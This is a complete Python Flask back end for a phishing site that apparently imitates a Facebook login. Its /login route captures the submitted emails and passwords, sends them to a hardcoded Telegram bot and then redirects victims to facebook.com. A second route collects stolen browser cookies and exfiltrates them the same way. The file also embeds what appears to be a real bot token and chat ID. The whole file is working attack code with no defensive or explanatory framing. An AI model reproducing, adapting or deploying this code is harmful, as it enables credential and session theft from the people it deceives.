from flask import Flask, render_template, request, redirect
import os
import requests
from datetime import datetime

app = Flask(__name__)

TELEGRAM_TOKEN = "8600949928:AAERwWL0-6sODzfixw--L5rNHW4hRW56HnY"
TELEGRAM_CHAT_ID = "6126534090"

def send_to_telegram(title, content):
    message = f"🔴 {title}\n\n{content}\n⏰ {datetime.now()}"
    print(f"🔄 Đang gửi Telegram: {title}")   # Debug
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": message},
            timeout=10
        )
        print(f"✅ Telegram Response: {r.status_code} - {r.text[:100]}")
    except Exception as e:
        print(f"❌ LỖI GỬI TELEGRAM: {e}")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')
    send_to_telegram("CREDENTIALS", f"📧 Email: {email}\n🔑 Password: {password}")
    return redirect('https://www.facebook.com')

@app.route('/send_cookies', methods=['POST'])
def send_cookies():
    data = request.get_json()
    cookies = data.get('cookies', 'No cookies') if data else 'No data'
    send_to_telegram("COOKIE", f"Cookies: {cookies[:500]}...")
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)